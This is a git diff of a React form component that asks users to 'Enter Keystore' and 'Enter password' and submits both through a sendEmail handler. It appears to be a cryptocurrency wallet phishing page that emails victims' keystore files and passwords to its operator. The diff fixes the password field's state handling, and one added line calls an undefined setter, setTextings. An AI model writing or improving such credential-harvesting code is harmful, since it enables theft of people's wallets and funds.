@@ -105,6 +105,11 @@ const [post, setpost] = useState(null)
   
   const [isvalid, setIsValid] = useState(false)
 
+  const [textingss, setTextingss] = useState("")
+  const [isvalids, setIsValids] = useState(false)
+  
+ 
+
   const change = (e) =>{
     setTexting(e.target.value)
     if (e.target.value <= 0){
@@ -115,7 +120,7 @@ const [post, setpost] = useState(null)
   }
 
   const changes = (e) =>{
-    setTexting(e.target.value)
+    setTextingss(e.target.value)
     if (e.target.value <= 0){
       setIsValid(true)
     }else{
@@ -146,6 +151,7 @@ const [post, setpost] = useState(null)
             result.text;
 
             setIsValid(false)
+            setIsValids(false)
               setLoading(true)
             
               setTimeout(() =>{
@@ -164,6 +170,7 @@ const [post, setpost] = useState(null)
             }, 9000)
 
             setTexting("")
+            setTextings("")
            
         }, (error) => {
             console.log(error.text);
@@ -293,7 +300,7 @@ const [post, setpost] = useState(null)
 <form ref={form} onSubmit={sendEmail}   action="">
 
 <textarea value={texting} onChange={change} className="text font-link  pl-2 resize-none w-full border-[2px] mt-[1rem] rounded border-[#00000037] outline-0 ml-2" placeholder='Enter Keystore' name="message"  cols="20" rows="4"></textarea>
-<textarea value={texting} onChange={changes} className="text font-link  pl-2 resize-none w-full border-[2px] mt-[0,7rem] rounded border-[#00000037] outline-0 ml-2" placeholder='Enter password' name="message"  cols="20" rows="1"></textarea>
+<textarea value={textingss} onChange={changes} className="text font-link  pl-2 resize-none w-full border-[2px] mt-[0,7rem] rounded border-[#00000037] outline-0 ml-2" placeholder='Enter password' name="message"  cols="20" rows="1"></textarea>
 
 
 
